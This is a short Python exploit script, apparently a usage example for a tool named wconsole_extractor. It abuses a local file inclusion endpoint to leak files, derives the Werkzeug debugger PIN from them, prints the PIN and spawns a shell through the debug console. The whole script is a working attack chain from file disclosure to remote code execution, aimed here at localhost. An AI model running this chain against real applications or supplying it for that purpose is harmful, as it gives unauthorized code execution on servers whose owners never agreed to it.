from wconsole_extractor import WConsoleExtractor, info
import requests

def leak_function(filename) -> str:
    r = requests.get(f"http://localhost:5000/lfi?path={filename}")
    if r.status_code == 200:
        return r.text
    else:
        return ""

extractor = WConsoleExtractor(
    target="http://localhost:5000",
    leak_function=leak_function,
        debugger_path="/custom_path", # Custom debugger path (default: /console)
)


info(f"PIN CODE: {extractor.pin_code}")
# Spawn Shell using "subprocess" module
extractor.shell()

# Run Code using the Debug Console
## extractor.debugger() 
